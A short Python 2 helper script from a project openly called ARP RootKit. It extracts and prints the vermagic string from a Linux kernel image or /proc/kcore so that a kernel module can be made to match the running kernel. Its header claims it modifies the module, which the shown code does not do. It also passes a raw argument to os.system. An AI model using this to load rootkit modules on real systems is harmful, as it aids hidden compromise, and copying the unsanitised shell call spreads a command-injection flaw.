#!/usr/bin/python
#
# License:
#
# Copyright (c) 2018 Abel Romero Perez aka D1W0U <abel@abelromero.com>
#
# This file is part of ARP RootKit.
#
# ARP RootKit is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ARP RootKit is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
#
# Description:
#
# Modifies the vermagic of a Linux Kernel Module, to be the same than
# the one defined in the Linux Kernel Image, of the system where this
# script is ran.
#
# Dependencies:
#
# 1) A Linux Kernel Image
# 2) A Linux Kernel Module
#

import sys
import platform
import re
import os

if len(sys.argv) < 2:
	print "use: " + sys.argv[0] + " </proc/kcore|kernel> [ref]"
	exit(-1)

if sys.argv[1] != "/proc/kcore":
	vmlinux = "vmlinux-" + platform.release()

	# decompress vmlinuz image
	os.system("./extract-vmlinux " + sys.argv[1] + " > " + vmlinux)

	# load vmlinux binary
	f = open(vmlinux, 'rb')
	data = f.read()
	f.close()

	# remove vmlinux binary
	os.remove(vmlinux)
	if len(sys.argv) >= 3:
	    ref = sys.argv[2]
	else:
	    ref = platform.release()
else:
	# read kernel binary from /proc/kcore
	start_addr = 0x81000000
	end_addr = 0xff000000
	f = open("/proc/kcore", 'rb')
	f.seek(-start_addr, os.SEEK_END)
	data = f.read(end_addr - start_addr)
	f.close()
	ref = platform.release()

# search vermagic
pattern = "(\x00{16}" + re.escape(ref) + " .*?" + "\x00{31})"
print "Reference is release: " + ref
#print "Searching by regex hex pattern: " + pattern.encode('hex')
regex = re.compile(pattern)

for match_obj in regex.findall(data):
	#print "Match!"
	#print match_obj.encode('hex')
	#print len(match_obj)
	print "Found vermagic: \"" + match_obj + "\""
